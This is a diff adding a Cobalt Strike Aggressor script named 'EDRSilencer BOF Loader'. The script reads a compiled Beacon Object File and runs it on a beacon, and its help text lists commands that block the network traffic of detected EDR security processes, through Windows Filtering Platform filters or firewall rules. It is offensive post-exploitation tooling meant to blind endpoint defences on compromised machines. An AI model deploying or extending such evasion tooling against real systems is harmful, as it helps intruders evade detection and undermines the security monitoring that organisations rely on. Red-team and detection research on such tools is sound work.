@@ -1,0 +1,50 @@
+# EDRSilencer BOF Loader
+# Version: 1.1
+#
+# Provides commands to manage network blocking rules using the EDRSilencer BOF.
+# Supports both Windows Filtering Platform (WFP) and Windows Firewall modes.
+
+alias edr_silence {
+    local('$bid $bof_path $bof_data $packed_args');
+    $bid = $1;
+    @args = @_; # All arguments as an array
+
+    # --- Help Text ---
+    if (size(@args) == 1) {
+        blog($bid, "--- EDRSilencer Help ---");
+        binfo($bid, "Usage: edr_silence [--firewall] <command> [argument]");
+        binfo($bid, " ");
+        binfo($bid, "Commands (Default WFP Mode):");
+        binfo($bid, "  edr_silence blockedr                    - Blocks all detected EDR processes.");
+        binfo($bid, "  edr_silence add C:\\path\\to\\proc.exe  - Adds a block rule for a specific process.");
+        binfo($bid, "  edr_silence list                        - Lists all active EDRSilencer WFP filters.");
+        binfo($bid, "  edr_silence remove <Filter ID>          - Removes a rule by its numeric ID (from 'list').");
+        binfo($bid, "  edr_silence removeall                   - Removes all rules, the sublayer, and provider.");
+        binfo($bid, " ");
+        binfo($bid, "Commands (Firewall Mode):");
+        binfo($bid, "  edr_silence --firewall blockedr         - Blocks EDRs using Windows Firewall rules.");
+        binfo($bid, "  edr_silence --firewall add C:\\path...   - Adds a Firewall rule for a specific process.");
+        binfo($bid, "  edr_silence --firewall remove C:\\path...- Removes a Firewall rule by its full path.");
+        binfo($bid, "  edr_silence --firewall removeall        - Removes all Firewall rules created by the tool.");
+        return;
+    }
+
+    # 1. Read the compiled BOF from disk.
+    $bof_path = script_resource("EDRSilencer-BOF.x64.o");
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+    closef($handle);
+
+    if ($bof_data is $null) {
+        berror($bid, "Could not read BOF file: " . $bof_path);
+        berror($bid, "Make sure 'EDRSilencer-BOF.x64.o' is in the same directory as the CNA script.");
+        return;
+    }
+
+    # 2. Pack all arguments as individual strings for the BOF to parse.
+    $packed_args = bof_pack($bid, "z" x size(@args[1..-1]), @args[1..-1]);
+
+    # 3. Execute the BOF.
+    blog($bid, "Tasking EDRSilencer with arguments: " . join(" ", @args[1..-1]));
+    bof_execute($bid, $bof_data, $packed_args);
+}
